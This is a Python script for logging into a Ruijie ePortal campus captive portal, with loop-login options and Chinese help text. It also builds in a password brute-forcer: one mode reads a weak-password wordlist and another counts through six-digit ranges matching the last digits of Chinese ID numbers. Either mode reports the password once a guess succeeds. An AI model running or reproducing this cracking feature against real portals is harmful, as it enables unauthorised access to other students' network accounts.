# !/usr/bin/env python
# -*-coding:utf-8-*-
import sys
import os
import requests
#from threading import Timer
from time import sleep
#跳转的URL,每个人的每一个环境可能不一样,用于定义在不需要认证的情况下也可以发送登录报文
#URL = r'http://10.100.10.251/eportal/index.jsp?wlanuserip=822116b5f1fc86e85a512b5ff27e843c&wlanacname=c4f2fd6200d97669e67e88409950b214&ssid=&nasip=9a0225c89437df46244894fce5813368&snmpagentip=&mac=381c16491e79338e267db5328fcff5be&t=wireless-v2&url=709db9dc9ce334aa499e3ba894d61ed828cc26a37698124a1995f489db07278b886cddddfef679d5&apmac=&nasid=c4f2fd6200d97669e67e88409950b214&vid=e74b757aba6dfb57&port=b1c5f0c2c1680863&nasportid=f5eb983692924fa26e6431fe9df4835fab2721b75605c19e308847a5ef2043f7062ade9d5223d0c0'
USERNAME = '-1'
PASSWORD = '-1'
SERVICE = r'0'
OPENURL = r'http://www.google.cn/generate_204'
ERR_STR = """
        -h      显示帮助,输入此项后只输出提示.

        -v      显示完整输出,可能会造成刷屏.

        -u      [字符串 user]    *后面加用户名(必填).

        -p      [字符串 password]   *后面加密码(必填).
                1)可以直接填写密码
                #暴力破解注意事项# 跑密码建议请选择可以登录"校园网络"的接入点测试,或者请选择正确的运营商.
                2)file:文件路径 可以实现跑弱口令,逐行读取.
                3)run:数字1-数字2 从 数字1 跑到 数字2 结束,
                    (身份证后六位范围010000-319999).
                    (建议加上pass参数)

        -id     [数字 0到1]  后面输入0-3 默认0,[
                0="校园网络",
                1="中国移动ChinaMobile",
                2="中国电信ChinaTelecom",
                3="中国联通ChinaUnicom"],不同学校运营商定义名称可能不同,请在源代码内手动修改数组.

        -t      [数字 秒]  循环登录,会根据当前输入的账号密码反复执行,延时{time}秒.不可以和跑密码(file和run)同时使用.
                手动停止请CRTL+C,或者配合-pass使用,登录成功后就退出.
                假如你已经登录,可能就无法使用-t,因为需要读取同目录下URL.txt文件来读取入网地址,请使用-URL参数生成,正常登录获取.

        -ti     [数字 秒]   配合循环登录使用,默认true(无限大),可以设置在{time}秒内登录,-ti次后结束.

        -pass   在重复验证中,会验证是否可连接外网,成功即验证成功,会额外消耗一定性能.

        -URL    1)使用此命令会自动保存入网地址到同目录下URL.txt文件,
                    2)如果此文件已经存在就忽略当前是否已经登录,直接用URL.txt的参数,每一个设备或接入点不同URL都不同,如果本地URL.txt过时或者错误请手动删除.
                        3)如果你需要在已经登录情况下发包就必须先获取URl.txt.

        https://github.com/alittlemc/ePortal-Web-Ruijie
        version 1.33
"""


def get_captive_server_response():
    return requests.get(OPENURL)


def start(code, response):
    id = [" ",
          "%e4%b8%ad%e5%9b%bd%e7%a7%bb%e5%8a%a8ChinaMobile",
          "%e4%b8%ad%e5%9b%bd%e7%94%b5%e4%bf%a1ChinaTelecom",
          "%e4%b8%ad%e5%9b%bd%e8%81%94%e9%80%9aChinaUnicom"]
    if "-v" in code:
        print_v = True
    else:
        print_v = False

    if "-pass" in code:
        print_pass = False
    else:
        print_pass = True

    if "-u" in code:
        USERNAME = code[code.index("-u")+1]
    else:
        print("缺少 -u 用户名")

    if "-id" in code:
        id_i = int(code[code.index("-id")+1])
        if id_i >= len(id) and id_i > 0:
            print("-id", id_i, " 超出取值范围")
            id_i = 0
    else:
        id_i = 0

    SERVICE = id[id_i]

    if "-t" in code:
        t = int(code[code.index("-t")+1])
    else:
        t = 0

    if "-ti" in code:
        ti = int(code[code.index("-ti")+1])
    else:
        ti = -1

    if "-p" in code:
        PASSWORD = code[code.index("-p")+1]
        i = 0
        #INFO = "-alittlemc"
        if "file:" in PASSWORD:
            print("匹配到file关键字")
            PASSWORD = PASSWORD[5:]
            for p in open(PASSWORD):
                p = p.replace("\n", "")
                i += 1
                re = login(response, USERNAME, str(p), SERVICE)
                if "success" in re:
                    return '{\"result\":\"success\",\"message\",\"第'+str(i)+'次尝试完成,密码是'+p+'\"}'
                elif print_v:
                    print(p+":\n"+re)
            return '{\"result\":\"false\",\"message\",\"尝试'+str(i)+'次,没有匹配到密码\"}'
        elif "run:" in PASSWORD:
            try:
                print("匹配到run关键字")
                arr = PASSWORD[4:].split("-")
                for p in range(int(arr[0]), int(arr[1])+1):
                    p = str(p)
                    l = len(p)
                    if l < 6:
                        p = "0"*(6-l)+p
                    i += 1
                    re = login(response, USERNAME, str(p), SERVICE)
                    if "success" in re:
                        return '{\"result\":\"success\",\"message\",\"第'+str(i)+'次尝试完成,密码是'+p+'\"}'
                    elif print_v:
                        print(p+":\n"+re)
                return '{\"result\":\"false\",\"message\",\"尝试'+str(i)+'次,没有匹配到密码\"}'
            except Exception as e:
                print(e, '129-lin')

        else:
            if t > 0:
                i = 1
                f = open(r'URL.txt')
                requests = f.read()
                while i != ti:
                    #t = Timer(t, login, [response, USERNAME, PASSWORD, SERVICE])
                    #t.start()
                    re = login(response, USERNAME, PASSWORD, SERVICE)
                    #print(get_captive_server_response().status_code)
                    if print_pass:
                        if print_v:
                            print("编号i:", i, "ti:", ti-i)
                            print(re)
                    elif get_captive_server_response().status_code == 204:
                        return re
                    else:
                        print(re)
                    sleep(t)
                    i += 1
                #t.cancel()
                return "登陆操作",i,"次"
            else:
                return login(response, USERNAME, PASSWORD, SERVICE)
    else:
        return "缺少 -p 密码"


def login(response, USERNAME, PASSWORD, SERVICE):
    #response_text = response.text
    login_page_url = response.split('\'')[1]
    login_url = login_page_url.split('?')[0].replace(
        'index.jsp', 'InterFace.do?method=login')
    query_string = login_page_url.split('?')[1]
    query_string = query_string.replace('&', '%2526')
    query_string = query_string.replace('=', '%253D')
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
    }
    login_post_data = 'userId={}&password={}&service={}&queryString={}&operatorPwd=&operatorUserId=&validcode=&passwordEncrypt=false'.format(
        USERNAME, PASSWORD, SERVICE, query_string)
    login_result = requests.post(
        url=login_url,
        data=login_post_data,
        headers=headers
    )

    return login_result.content.decode('utf-8')


if __name__ == '__main__':
    try:
        print(len(sys.argv))
        if "-h" in sys.argv or len(sys.argv)<=4:
            print(ERR_STR)
        else:
            captive_server_response = get_captive_server_response()
            if "-URL" in sys.argv:
                unt = True
            else:
                unt = False

            if captive_server_response.status_code != 204 or unt:
                if unt:
                    if os.path.exists('URL.txt'):
                        f = open(r'URL.txt', 'r')
                        fout = f.read()
                        f.close()
                        print('#本地URL', fout)
                        print(start(sys.argv, fout))
                    else:
                        f = open(r'URL.txt', 'w')
                        f.write(str(captive_server_response.text))
                        f.close()
                        print('#无本地URL', captive_server_response.text)
                        print(start(sys.argv, captive_server_response.text))
                else:
                    print('URL', captive_server_response.text)
                    print(start(sys.argv, captive_server_response.text))
            else:
                print('当前已经可以连接网络,无需连接')
    except Exception as e:
        print("#错误信息", e, "\n",)
